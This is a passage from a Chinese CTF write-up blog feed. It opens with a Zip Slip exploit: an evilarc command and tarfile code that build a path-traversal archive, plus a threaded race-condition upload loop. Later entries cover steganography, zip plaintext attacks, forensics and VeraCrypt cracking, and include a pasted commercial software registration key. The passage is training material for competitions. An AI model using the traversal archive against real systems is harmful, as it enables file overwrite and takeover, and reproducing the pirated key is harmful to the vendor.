Zip Slip系列漏洞</p></li><li><p>参照链接中的方式构造一个恶意的tar包即可</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">python evilarc.py userConfig.yml --os=unix --depth=<span class="hljs-number">4</span> --output-file=<span class="hljs-number">1.</span>tar --path=config/<br><br></code></pre></td></tr></table></figure><p>看了一下源码中对tar构造，其实也就是三行</p><p><img src="/../imgs/20220612Pwnhub/image_oUqX9MDuIg.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">zpath = <span class="hljs-built_in">dir</span>*options.depth+options.path+os.path.basename(fname)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">tar = tarfile.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;1.tar&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br>tar.add(<span class="hljs-string">&quot;userConfig.yaml&quot;</span>,<span class="hljs-string">&quot;test/../../../../config/userConfig.yaml&quot;</span>)<br>tar.close()<br></code></pre></td></tr></table></figure></li><li><p>最后简单配合一个条件竞争的脚本即可，条件要是登陆的时候username&#x3D;’Admin’，再一直上传</p><p>其中就上传文件，百度了一下，线程直接，就不贴长脚本了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">file_s = [(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.tar&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>))] <span class="hljs-comment">#文件传入requests中的参数</span><br><span class="hljs-comment">#线程配置</span><br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    t = Thread(target=upload)  <span class="hljs-comment">#创建线程，upload是函数名</span><br>    t.start()   <span class="hljs-comment">#开启线程</span><br>    t_1 = Thread(target=race)  <span class="hljs-comment">#创建线程</span><br>    t_1.start()   <span class="hljs-comment">#开启线程</span><br><br></code></pre></td></tr></table></figure><p><img src="/../imgs/20220612Pwnhub/image_qszVwkDzU4.png"></p></li></ul><h1 id="Misc-伏羲八卦"><a href="#Misc-伏羲八卦" class="headerlink" title="Misc: 伏羲八卦"></a>Misc: 伏羲八卦</h1><h2 id="题目附件-1"><a href="#题目附件-1" class="headerlink" title="题目附件"></a>题目附件</h2><p><img src="/../imgs/20220612Pwnhub/gif_EzxhFGi-sI.gif"></p><h2 id="一、储备-1"><a href="#一、储备-1" class="headerlink" title="一、储备"></a>一、储备</h2><p><a href="http://home.nutn.edu.tw/xifeng61/@philosophy/iching/le%20issues%20of%20gua%20xu.htm">http://home.nutn.edu.tw/xifeng61/@philosophy/iching/le%20issues%20of%20gua%20xu.htm</a></p><img src="../imgs/20220612Pwnhub/image_eE7wuYyz2a.png" style="zoom: 50%;" /><img src="../imgs/20220612Pwnhub/image_WYKPCt365i.png" style="zoom: 25%;" /><p>伏羲卦序：思辨的，先天、抽象的演算</p><p><a href="https://blog.csdn.net/weixin_44110537/article/details/107494966">https://blog.csdn.net/weixin_44110537/article/details/107494966</a></p><h2 id="二、思路-1"><a href="#二、思路-1" class="headerlink" title="二、思路"></a>二、思路</h2><ul><li><p>将342个图片识别为八卦</p></li><li><p>识别后转换为八进制得到文本</p></li></ul><h2 id="三、步骤"><a href="#三、步骤" class="headerlink" title="三、步骤"></a>三、步骤</h2><h4 id="1-提取每个帧"><a href="#1-提取每个帧" class="headerlink" title="1.提取每个帧"></a>1.提取每个帧</h4><p>（网站是按顺序提取的，Mac可以看到Gif顺序）</p><p><a href="https://ezgif.com/split/ezgif-5-5be7105a91.gif">https://ezgif.com/split/ezgif-5-5be7105a91.gif</a></p><img src="../imgs/20220612Pwnhub/image_ewS2CU-2Jn.png" style="zoom:33%;" /><h4 id="2-提取"><a href="#2-提取" class="headerlink" title="2.提取"></a>2.提取</h4><p>懒，直接用文件大小提取</p><p>乾 000 0001 ☰ 1,297 字节（磁盘上的4 KB）</p><p>兑 001 0010  ☱ 1,687 字节（磁盘上的4 KB）  还有第一个是 1706 字节</p><p>离 010 0011 ☲ 1,484 字节（磁盘上的4 KB）</p><p>震 011 0100 ☳ 1,662 字节（磁盘上的4 KB）</p><p>巽 100 0101 ☴ 1,438 字节（磁盘上的4 KB）</p><p>坎 101 0110  ☵ 1,681 字节（磁盘上的4 KB）</p><p>艮 110 0111 ☶ 1,588 字节（磁盘上的4 KB）</p><p>坤 111 1000 ☷ 1,705 字节（磁盘上的4 KB）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-built_in">dict</span> = &#123; <span class="hljs-number">1297</span> : <span class="hljs-string">&quot;☰&quot;</span>, <span class="hljs-number">1706</span> : <span class="hljs-string">&quot;☱&quot;</span>,<span class="hljs-number">1687</span> : <span class="hljs-string">&quot;☱&quot;</span>, <span class="hljs-number">1484</span> : <span class="hljs-string">&quot;☲&quot;</span>, <span class="hljs-number">1662</span> : <span class="hljs-string">&quot;☳&quot;</span>, <span class="hljs-number">1438</span> : <span class="hljs-string">&quot;☴&quot;</span>, <span class="hljs-number">1681</span>: <span class="hljs-string">&quot;☵&quot;</span>, <span class="hljs-number">1588</span> :<span class="hljs-string">&quot;☶&quot;</span>, <span class="hljs-number">1705</span>:<span class="hljs-string">&quot;☷&quot;</span>&#125;<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">342</span>):<br>    <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">10</span>:<br>        s = <span class="hljs-string">&#x27;00&#x27;</span> + <span class="hljs-built_in">str</span>(i)<br>    <span class="hljs-keyword">elif</span> i &lt; <span class="hljs-number">100</span>:<br>        s = <span class="hljs-string">&#x27;0&#x27;</span> + <span class="hljs-built_in">str</span>(i)<br>    <span class="hljs-keyword">else</span>:<br>        s = <span class="hljs-built_in">str</span>(i)<br><span class="hljs-comment">#     print(&#x27;./shibie/frame_&#x27;+s+&#x27;_delay-1s.gif&#x27; + str(os.path.getsize(&#x27;./shibie/frame_&#x27;+s+&#x27;_delay-1s.gif&#x27;)))</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">dict</span>[os.path.getsize(<span class="hljs-string">&#x27;./shibie/frame_&#x27;</span>+s+<span class="hljs-string">&#x27;_delay-1s.gif&#x27;</span>)],end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>☱☳☳☰☷☰☱☳☵☱☳☳☰☶☱☰☶☱☰☵☱☱☳☳☰☶☱☱☴☱☱☳☵☱☳☳☰☶☲☰☶☳☰☵☱☱☳☳☱☳☲☱☵☵☱☷☰☱☵☰☱☳☲☰☶☳☱☶☴☱☰☵☰☶☲☱☳☲☱☴☱☱☶☲☱☵☰☱☴☶☱☴☲☱☰☲☱☴☳☱☱☵☱☰☳☰☶☱☰☶☵☱☲☴☰☶☳☱☲☵☱☶☴☱☴☲☱☲☵☱☰☳☱☳☰☱☱☶☱☲☷☱☲☲☱☱☲☱☶☴☱☰☱☱☰☴☱☰☶☱☶☲☱☳☲☱☲☳☰☶☱☱☶☷☱☴☲☱☰☷☱☰☶☱☴☵☱☰☲☱☰☷☰☶☲☱☰☶☱☵☰☱☰☲☱☲☲☱☴☷☱☵☱☱☶☱☰☶☳☱☴☷☰☶☵☱☴☲☱☰☷☰☶☵☱☵☶☱☱☴☱☲☷☰☶☰☱☷☰☱☴☳☰☶☲☱☵☳☱☱☰☱☷☱☱☵☷☱☱☶☱☶☱☱☵☱☱☲☴☱☳☰☱☴☳☱☵☵☱☵☱☱☳☵☱☳☳☰☶☲☱☴☴☱☳☵☱☳☳☰☶☳☱☴☱☰☵☱☱☳☳☰☶☴☰☶☵☱☳☵☱☳☳☰☶☵☰☶☱☰☵☱</p><h4 id="3-解码"><a href="#3-解码" class="headerlink" title="3.解码"></a>3.解码</h4><p>用了这师傅的解码好像不太行</p><p><a href="https://github.com/chyroc/base8-bagua">https://github.com/chyroc/base8-bagua</a></p><p><img src="/../imgs/20220612Pwnhub/image_-Vr3S-rNnL.png"></p><p>又重新找了一个用python实现的</p><p><a href="https://blog.csdn.net/lkjlsj/article/details/103742129">https://blog.csdn.net/lkjlsj/article/details/103742129</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">bArrToStr</span>(<span class="hljs-params">bArr</span>):<br> <br>    nByte = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> bArr:<br>        nByte += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(b,base=<span class="hljs-number">8</span>)).encode(<span class="hljs-string">&#x27;raw_unicode_escape&#x27;</span>)<br> <br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>.decode(nByte)<br> <br> <br><span class="hljs-comment">#</span><br><span class="hljs-comment"># 八卦符转八进制</span><br><span class="hljs-comment">#</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">to8bArr</span>(<span class="hljs-params">baguaStr</span>):<br>    code = &#123;<span class="hljs-string">&#x27;☰&#x27;</span>:<span class="hljs-string">&#x27;0&#x27;</span>,  <span class="hljs-comment"># 乾</span><br>            <span class="hljs-string">&#x27;☱&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,  <span class="hljs-comment"># 兑</span><br>            <span class="hljs-string">&#x27;☲&#x27;</span>:<span class="hljs-string">&#x27;2&#x27;</span>,  <span class="hljs-comment"># 离</span><br>            <span class="hljs-string">&#x27;☳&#x27;</span>:<span class="hljs-string">&#x27;3&#x27;</span>,  <span class="hljs-comment"># 震</span><br>            <span class="hljs-string">&#x27;☴&#x27;</span>:<span class="hljs-string">&#x27;4&#x27;</span>,  <span class="hljs-comment"># 巽</span><br>            <span class="hljs-string">&#x27;☵&#x27;</span>:<span class="hljs-string">&#x27;5&#x27;</span>,  <span class="hljs-comment"># 坎</span><br>            <span class="hljs-string">&#x27;☶&#x27;</span>:<span class="hljs-string">&#x27;6&#x27;</span>,  <span class="hljs-comment"># 艮</span><br>            <span class="hljs-string">&#x27;☷&#x27;</span>:<span class="hljs-string">&#x27;7&#x27;</span>,  <span class="hljs-comment"># 坤</span><br>            &#125;<br> <br>    bArr = []<br> <br>    temp = []<br>    <span class="hljs-comment"># 把八卦符转为8进制数字</span><br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> baguaStr:<br>        temp.append(code[s])<br><span class="hljs-comment">#     print(temp)</span><br>    tempStr = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># 数字3个一组 组合回八进制</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(temp)):<br> <br>        tempStr += temp[i]<br> <br>        <span class="hljs-keyword">if</span> i % <span class="hljs-number">3</span> == <span class="hljs-number">2</span>:<br>            bArr.append(<span class="hljs-string">&#x27;0o&#x27;</span>+tempStr)<br>            tempStr = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-built_in">print</span>(bArr)<br>    <span class="hljs-keyword">return</span> bArr<br>arr = to8bArr(<span class="hljs-string">&quot;☱☳☳☰☷☰☱☳☵☱☳☳☰☶☱☰☶☱☰☵☱☱☳☳☰☶☱☱☴☱☱☳☵☱☳☳☰☶☲☰☶☳☰☵☱☱☳☳☱☳☲☱☵☵☱☷☰☱☵☰☱☳☲☰☶☳☱☶☴☱☰☵☰☶☲☱☳☲☱☴☱☱☶☲☱☵☰☱☴☶☱☴☲☱☰☲☱☴☳☱☱☵☱☰☳☰☶☱☰☶☵☱☲☴☰☶☳☱☲☵☱☶☴☱☴☲☱☲☵☱☰☳☱☳☰☱☱☶☱☲☷☱☲☲☱☱☲☱☶☴☱☰☱☱☰☴☱☰☶☱☶☲☱☳☲☱☲☳☰☶☱☱☶☷☱☴☲☱☰☷☱☰☶☱☴☵☱☰☲☱☰☷☰☶☲☱☰☶☱☵☰☱☰☲☱☲☲☱☴☷☱☵☱☱☶☱☰☶☳☱☴☷☰☶☵☱☴☲☱☰☷☰☶☵☱☵☶☱☱☴☱☲☷☰☶☰☱☷☰☱☴☳☰☶☲☱☵☳☱☱☰☱☷☱☱☵☷☱☱☶☱☶☱☱☵☱☱☲☴☱☳☰☱☴☳☱☵☵☱☵☱☱☳☵☱☳☳☰☶☲☱☴☴☱☳☵☱☳☳☰☶☳☱☴☱☰☵☱☱☳☳☰☶☴☰☶☵☱☳☵☱☳☳☰☶☵☰☶☱☰☵☱&quot;</span>)<br><span class="hljs-built_in">print</span>(bArrToStr(arr))<br></code></pre></td></tr></table></figure><p><img src="/../imgs/20220612Pwnhub/image_wXxkaNl-_f.png"></p><h4 id="4-final-amp-x20"><a href="#4-final-amp-x20" class="headerlink" title="4.final&amp;#x20;"></a>4.final&amp;#x20;</h4><p>已经看到成功的感觉了，但是不太对前面</p><p>按照给的序列重新排了一下</p><p><img src="/../imgs/20220612Pwnhub/image_x6eG1uX3rh.png"></p><p><img src="/../imgs/20220612Pwnhub/image_38gK_nWXtC.png"></p><p>有被混淆到，出题师傅应该是先用base64作为提示是base系列</p><p><img src="/../imgs/20220612Pwnhub/image_llKXQNn0Cv.png"></p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="ctfwp" scheme="https://www.imfengyuan.info/categories/ctfwp/"/>
    
    
  </entry>
  
  <entry>
    <title>2022-DasMay-Misc-Wp</title>
    <link href="https://www.imfengyuan.info/2022/05/21/DAS-MAY/"/>
    <id>https://www.imfengyuan.info/2022/05/21/DAS-MAY/</id>
    <published>2022-05-21T18:37:16.000Z</published>
    <updated>2022-05-21T18:37:16.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DASCTF-MAY-MISC"><a href="#DASCTF-MAY-MISC" class="headerlink" title="DASCTF-MAY-MISC"></a>DASCTF-MAY-MISC</h1><h3 id="MISC签到"><a href="#MISC签到" class="headerlink" title="MISC签到"></a>MISC签到</h3><img src="../imgs/DAS-MAY/image-20220521183849807.png" alt="image-20220521183849807" style="zoom:33%;" /><p><img src="/../imgs/DAS-MAY/image-20220521183915905.png" alt="image-20220521183915905"></p><h3 id="神必流量"><a href="#神必流量" class="headerlink" title="神必流量"></a>神必流量</h3><p>USB流量</p><p><a href="https://github.com/nneonneo/sstic-2021/tree/adddf4928f76aadeaf2cf48eaebf929ddee8645d">https://github.com/nneonneo/sstic-2021/tree/adddf4928f76aadeaf2cf48eaebf929ddee8645d</a></p><p>利用轮子提usb数据</p><p><img src="/../imgs/DAS-MAY/image-20220521184128217.png" alt="image-20220521184128217"></p><p>注释123456解开file.zip 运行一下发现需要读入文件，然后试了下把out.txt改成了flag.txt，再运行一下发现出了新的out.txt，感觉像是异或？</p><p><img src="/../imgs/DAS-MAY/image-20220521184520565.png" alt="image-20220521184520565"></p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="ctfwp" scheme="https://www.imfengyuan.info/categories/ctfwp/"/>
    
    
  </entry>
  
  <entry>
    <title>2022-ichunqiu|Spring勇者山峰-Misc-Wp</title>
    <link href="https://www.imfengyuan.info/2022/05/08/2022-i%E6%98%A5%E7%A7%8B-%E6%98%A5%E5%AD%A3/"/>
    <id>https://www.imfengyuan.info/2022/05/08/2022-i%E6%98%A5%E7%A7%8B-%E6%98%A5%E5%AD%A3/</id>
    <published>2022-05-08T10:53:16.000Z</published>
    <updated>2022-05-08T12:09:16.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2022-i春秋-Spring-勇者山峰-Misc-Writeup-By-K3"><a href="#2022-i春秋-Spring-勇者山峰-Misc-Writeup-By-K3" class="headerlink" title="2022 i春秋-Spring 勇者山峰 Misc-Writeup By K3"></a>2022 i春秋-Spring 勇者山峰 Misc-Writeup By K3</h1><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul><li><p><a href="#score">Score</a></p></li><li><p><a href="#tiger">Tiger</a></p><ul><li><a href="#flag">Flag</a></li></ul></li><li><p><a href="#%E6%9C%BA%E5%AF%86%E7%9A%84%E6%96%87%E4%BB%B6">机密的文件</a></p><ul><li><a href="#flag-1">Flag</a></li></ul></li><li><p><a href="#%E7%AD%BE%E5%88%B0">签到</a></p></li><li><p><a href="#recoverme">Recoverme</a></p><ul><li><a href="#flag-2">Flag</a></li></ul></li><li><p><a href="#capture-radiate-chart">Capture Radiate Chart</a></p><ul><li><a href="#flag-3">Flag</a></li></ul></li><li><p><a href="#pintu">PINTU</a></p><ul><li><a href="#flag-4">Flag</a></li></ul></li></ul><h2 id="Score"><a href="#Score" class="headerlink" title="Score"></a>Score</h2><p><img src="/../imgs/2022-i%E6%98%A5%E7%A7%8B-%E6%98%A5%E5%AD%A3/image_r4R4RCu-IL.png"></p><p><img src="/../imgs/2022-i%E6%98%A5%E7%A7%8B-%E6%98%A5%E5%AD%A3/image_bswamz2O_y.png" alt="基本上都是图片类型的题，还算是不错，有些脑洞很大，有些可能非预期了，有些优点套，题目还是很不错的。" title="基本上都是图片类型的题，还算是不错，有些脑洞很大，有些可能非预期了，有些优点套，题目还是很不错的。"></p><h2 id="Tiger"><a href="#Tiger" class="headerlink" title="Tiger"></a>Tiger</h2><blockquote><p>png图片-LSB隐写-cloacked-pixel工具（下载<a href="https://github.com/cyberinc/cloacked-pixel%EF%BC%89">https://github.com/cyberinc/cloacked-pixel）</a><br>cloacked-pixel在加密的过程中会删除其他数据块，只保留关键数据块IDAT<br>加密：python <a href="http://lsb.py/" title="lsb.py">lsb.py</a> hide big.png 1.txt 123456<br>hide：表示加密模式 big.png：待加密的png图片<br>1.txt：存放payload 123456：加密的密码<br>运行后生成图片big.png-stego.png<br>解密：python <a href="http://lsb.py/" title="lsb.py">lsb.py</a> extract big.png-stego.png 3.txt 123456<br>extract：表示解密模式 big.png-stego.png：待解密的<br>————————————————<br>版权声明：本文为CSDN博主「n4nch3ng」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。原文链接：<a href="https://blog.csdn.net/fuzz_nancheng/article/details/62428776" title="https://blog.csdn.net/fuzz_nancheng/article/details/62428776">https://blog.csdn.net/fuzz_nancheng&#x2F;article&#x2F;details&#x2F;62428776</a></p></blockquote><p>巧了前几周做了腾讯的T-STAR，一堆MISC，现在做图片题真的有点得心应手，看到stego加密，直接lsb.py上手，发现Password里的密钥不对，看了眼tips，rot47，简单解密。用的工具：<strong>Electron</strong></p><p><img src="/../imgs/2022-i%E6%98%A5%E7%A7%8B-%E6%98%A5%E5%AD%A3/image_UtHIiC6IPP.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">python2 ../cloacked-pixel-master/lsb.py extract ../key.png-stego.png text.txt 28a217fe<br>[+] Image size: 1080x1082 pixels.<br>[+] Written extracted data to text.txt.<br><br>cat text.txt<br>71zr9H6jnXRHn64WBxMbCzz16saCZWiw<br><br></code></pre></td></tr></table></figure><p>得到解压密码，解开where.zip，看到key.zip和flag.zip，很明显发现flag.zip里面有key.zip的内容是明文攻击，看一下压缩信息是**“存储&#x2F;store”zip的压缩**，符合明文攻击，windows工具：ARCHPR</p><p>工具注册码：ARCHPRP-GSVMT-66892-GKVMB-52992&amp;#x20;</p><p><a href="file/ARCHPR_20937_Q_W9hzunlV.zip">ARCHPR_20937.zip</a></p><p>点击密钥旁边直接提取，发现文件的flag是一个png，打开是二维码</p><p><img src="/../imgs/2022-i%E6%98%A5%E7%A7%8B-%E6%98%A5%E5%AD%A3/flag_d01MlAoItA.png"></p><p>扫描后得到：f‍‎﻿​﻿‍﻿​﻿‏‍​‏‏‌​﻿‍﻿​﻿‍‍​﻿‌‎​‏‏‌​﻿‌‎​‏‏‌​﻿﻿‎​﻿‎﻿​﻿‏‌​﻿‏﻿​‏‏‌​‍‏‍​‌‍‏​‍‌‌​‍﻿‌​﻿‍‍​‏‏‌​﻿‏‌​﻿‌﻿​﻿‍‏​﻿‍‏​﻿‌‍​‍﻿‍​﻿‍‌​‏‏‌​﻿‎‍​﻿‎‌​﻿‌‍​‏‏‌​﻿‎‍​﻿‏‏​‍﻿‌​‏‏‌​﻿‏‏​﻿‎﻿​﻿‎﻿​﻿‎‏​﻿‍‌​‏‏‌​﻿‍‌​﻿‌‌​‏‏‌​﻿﻿‏​﻿‏‍​﻿‏‏​﻿﻿‏​‍﻿﻿​﻿﻿‎​﻿‏‏​﻿‌‌​﻿‍‌​‏‍﻿​‏‏‌​﻿‍‍​﻿‍‍​﻿‍‏​﻿﻿‎​‏‏‌​‍‏‌​‏‏‌​﻿‏‏​﻿﻿‌​﻿‎‏​﻿‎﻿​‏‏‌​﻿‌‌​﻿﻿‏​﻿‎‎​﻿‍‍​‏‏‌​﻿‍‌​﻿‍‎​﻿‎‎​‏‏‌​﻿﻿‌​﻿‌‌​‏‏‌​﻿‏‍​‍﻿‌​﻿‏‍​﻿‎﻿​﻿‏﻿​﻿‏‌​‏‍﻿​‏‏‌​﻿‏‎​‍﻿﻿​‏‏‌​‍﻿‍​﻿‌﻿​﻿‍‏​﻿‏‌​‍﻿‌​‍﻿﻿​‏‏‌​﻿﻿‏​‍﻿‌​‏‏‌​﻿‍﻿​﻿‎﻿​﻿‎‏​﻿‌‌​﻿﻿‍​‌‏‏​‌‎﻿​‌‎﻿​﻿‌‍​‌‎‏​‌‏‎​‌‎‍​‌‎‍​‏﻿‎​﻿‍‏​‌‎‏​‌‎‍​‌‏‏​‏﻿‎​‌‎‍​‏﻿﻿​‏﻿﻿​‌‏‌​‏﻿‎​﻿‍‏​﻿﻿‎​﻿‌‎​﻿‌﻿​‏﻿‎​﻿‏‏​﻿‍‌​﻿‍﻿​‌‎﻿​‌‎﻿​‌‎﻿​﻿‎‏​‌‏‏​‏﻿‍​‌‏‌​‌‏‌​﻿‏﻿​‏‎‎‎​‏‍﻿​‏‏‌​﻿‍‌​﻿‌﻿​﻿‌‏​‍﻿‌​‏‏‌​﻿‌‏​﻿‏‌​﻿‍‍​‏‏‍lag is not here</p><p>一开始，我真的以为flag不在这个图片，不是扫描出来的，然后我把png整个给他锁了一遍，binwalk pngcheck IDAT steg都梭了一遍，后面想了想会不会是0宽，（其实一开始也是想到了，但是没一直删到f）然后删到f发现，日，真的不动了。看了一下16进制，稳稳的0宽</p><p><img src="/../imgs/2022-i%E6%98%A5%E7%A7%8B-%E6%98%A5%E5%AD%A3/image_s6RF5Ozp5F.png"></p><p>试了几个在线网站，发现在</p><p><a href="https://yuanfux.github.io/zero-width-web/" title="Zero Width Lib (yuanfux.github.io)">Zero Width Lib (yuanfux.github.io)</a>接出来</p><p><img src="/../imgs/2022-i%E6%98%A5%E7%A7%8B-%E6%98%A5%E5%AD%A3/image_jzo76R2ATc.png"></p><blockquote><p>在线工具  <a href="https://offdev.net/demos/zwsp-steg-js" title="https://offdev.net/demos/zwsp-steg-js">https://offdev.net/demos/zwsp-steg-js</a> &amp;#x20;</p><p><a href="http://330k.github.io/misc_tools/unicode_steganography.html" title="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools&#x2F;unicode_steganography.html</a> &amp;#x20;</p><p><a href="http://www.atoolbox.net/Tool.php?Id=829" title="http://www.atoolbox.net/Tool.php?Id=829">http://www.atoolbox.net/Tool.php?Id=829</a></p><p><a href="https://yuanfux.github.io/zero-width-web/" title="https://yuanfux.github.io/zero-width-web/">https://yuanfux.github.io/zero-width-web/</a> &amp;#x20;</p></blockquote><p>这个如果是常刷题的misc手应该都知道vigenere爆破，或者<strong>substitution ciphers</strong></p><p>两个网站都试了一下<a href="https://www.guballa.de/vigenere-solver" title="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a>，<a href="http://www.quipqiup.com/" title="quipqiup - cryptoquip and cryptogram solver">quipqiup - cryptoquip and cryptogram solver</a></p><p><img src="/../imgs/2022-i%E6%98%A5%E7%A7%8B-%E6%98%A5%E5%AD%A3/image_a7bwO0K7ab.png"></p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><p>flag{866d3755-c358-5119-abeb-bda666a8099d}</p><h2 id="机密的文件"><a href="#机密的文件" class="headerlink" title="机密的文件"></a>机密的文件</h2><p>取证大师一波梭，因为说了不是套娃的题，说实话取证真的很适合……</p><p><img src="/../imgs/2022-i%E6%98%A5%E7%A7%8B-%E6%98%A5%E5%AD%A3/image_80dmjZ_7TU.png"></p><p>&amp;#x20;   如果不从工具的角度，其实要分析到打印机的数据流，还是比较困难的，其中还有一些小彩蛋，烟雾弹什么的……</p><p>完整路径：春秋\D:\BaiduNetdiskDownload\被带走的机密文件\image.E01\分区1_本地磁盘[C]:\Windows\System32\spool\PRINTERS\00004.SPL</p><h3 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag"></a>Flag</h3><p>flag{1136d 459-2885-409a-bc 54-beea0739544b}</p><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>试了好几遍……</p><p><img src="/../imgs/2022-i%E6%98%A5%E7%A7%8B-%E6%98%A5%E5%AD%A3/image_XizUB5aQme.png"></p><h2 id="Recoverme"><a href="#Recoverme" class="headerlink" title="Recoverme"></a>Recoverme</h2><p>看了一下题目信息，很明显的取证题。工具都要用烂了。ve开头的加密 →  VeraCrypt，参加取证比赛的应该都知道这个，去年做美亚的时候就知道新版的PasswareKit可以爆破VeraCrypt了，给了密码本</p><p><img src="/../imgs/2022-i%E6%98%A5%E7%A7%8B-%E6%98%A5%E5%AD%A3/image_OF1qBOPZEn.png"></p><p>然后挂载起来，一开始看到里面俩个图片，简单梭了梭，没发现啥，然后突然意识到题目名是Recover，然后用取证大师看了下，直接恢复</p><p><img src="/../imgs/2022-i%E6%98%A5%E7%A7%8B-%E6%98%A5%E5%AD%A3/image_-FRBEN1PVt.png"></p><p>提取出来，发现ICMP流，通常想到的就是数据提取，但是，问题在于data段一直都是重复，完全没有规律可言，但是发现length段为80 75 3 4 ，好像是50 4B 03 04，又参考了一篇文章，发现是压缩包，解压需要输入密码，看到注释</p><p><img src="/../imgs/2022-i%E6%98%A5%E7%A7%8B-%E6%98%A5%E5%AD%A3/image_14EWMCiMxM.png"></p><p>有被无语到，想到了那个常见的0和1。。。然后38&#x3D;0.39&#x3D;1，写了个很拉跨的脚本</p><p><img src="/../imgs/2022-i%E6%98%A5%E7%A7%8B-%E6%98%A5%E5%AD%A3/image_AUKIAVoif0.png"></p><p>读取数据的脚本参考了<a href="https://www.twblogs.net/a/5d662d6abd9eee541c331a4e" title="https://www.twblogs.net/a/5d662d6abd9eee541c331a4e">https://www.twblogs.net/a/5d662d6abd9eee541c331a4e</a></p><p>综合脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> 